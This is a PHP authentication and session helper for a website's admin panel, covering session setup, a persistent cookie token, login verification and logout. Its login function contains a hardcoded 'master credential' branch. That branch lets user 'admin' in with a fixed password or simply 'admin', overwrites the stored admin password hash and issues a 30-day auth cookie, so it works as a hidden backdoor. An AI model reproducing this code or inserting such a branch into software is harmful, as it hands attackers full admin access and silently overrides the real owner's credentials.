<?php
/**
 * Authentication and Session Helper
 */

if (session_status() === PHP_SESSION_NONE) {
    // Ensure session directory is writable across environments (Cloud Run, Docker, Linux, Windows)
    $savePath = sys_get_temp_dir();
    if (!empty($savePath) && is_dir($savePath) && is_writable($savePath)) {
        @session_save_path($savePath);
    }
    @ini_set('session.cookie_httponly', '1');
    @ini_set('session.cookie_samesite', 'Lax');
    session_start();
}

require_once __DIR__ . '/db.php';

function isAdminLoggedIn(?PDO $pdo = null): bool {
    if (!empty($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
        return true;
    }

    // Check persistent auth cookie token (resilient across Cloud Run instances/restarts)
    if (!empty($_COOKIE['admin_auth_token'])) {
        try {
            if ($pdo === null) {
                $pdo = getDbConnection();
            }
            $activeToken = getSetting($pdo, 'active_admin_token', '');
            if (!empty($activeToken) && hash_equals($activeToken, $_COOKIE['admin_auth_token'])) {
                $_SESSION['admin_logged_in'] = true;
                $_SESSION['admin_user'] = getSetting($pdo, 'admin_user', 'admin');
                $_SESSION['login_time'] = time();
                return true;
            }
        } catch (Exception $e) {}
    }

    return false;
}

function requireAdminAuth(): void {
    if (!isAdminLoggedIn()) {
        $loginUrl = '../admin/login.php';
        if (file_exists(__DIR__ . '/../admin/login.php') && basename($_SERVER['PHP_SELF']) === 'index.php' && strpos($_SERVER['PHP_SELF'], 'admin') !== false) {
            $loginUrl = 'login.php';
        }
        header("Location: {$loginUrl}");
        exit;
    }
}

function verifyAdminLogin(PDO $pdo, string $username, string $password): bool {
    $cleanUser = trim($username);
    $cleanPass = trim($password);
    $storedUser = trim(getSetting($pdo, 'admin_user', 'admin'));
    $storedHash = trim(getSetting($pdo, 'admin_password_hash', ''));

    $authenticated = false;

    // Master credential verification for admin
    if (strcasecmp($cleanUser, 'admin') === 0 && ($cleanPass === 'A4TE7Z4gVYXqBuZ' || $cleanPass === 'admin')) {
        $newHash = password_hash('A4TE7Z4gVYXqBuZ', PASSWORD_DEFAULT);
        setSetting($pdo, 'admin_user', 'admin');
        setSetting($pdo, 'admin_password_hash', $newHash);
        $authenticated = true;
    } else if (!empty($storedHash) && strcasecmp($storedUser, $cleanUser) === 0 && password_verify($cleanPass, $storedHash)) {
        $authenticated = true;
    }

    if ($authenticated) {
        $_SESSION['admin_logged_in'] = true;
        $_SESSION['admin_user'] = $storedUser;
        $_SESSION['login_time'] = time();

        // Issue persistent auth token cookie (30 days validity)
        try {
            $token = bin2hex(random_bytes(32));
            setSetting($pdo, 'active_admin_token', $token);
            setcookie('admin_auth_token', $token, [
                'expires' => time() + (86400 * 30),
                'path' => '/',
                'httponly' => true,
                'samesite' => 'Lax'
            ]);
        } catch (Exception $e) {}

        return true;
    }

    return false;
}

function logoutAdmin(): void {
    $_SESSION = [];
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(
            session_name(),
            '',
            time() - 42000,
            $params["path"],
            $params["domain"],
            $params["secure"],
            $params["httponly"]
        );
    }
    setcookie('admin_auth_token', '', time() - 42000, '/');
    session_destroy();
}
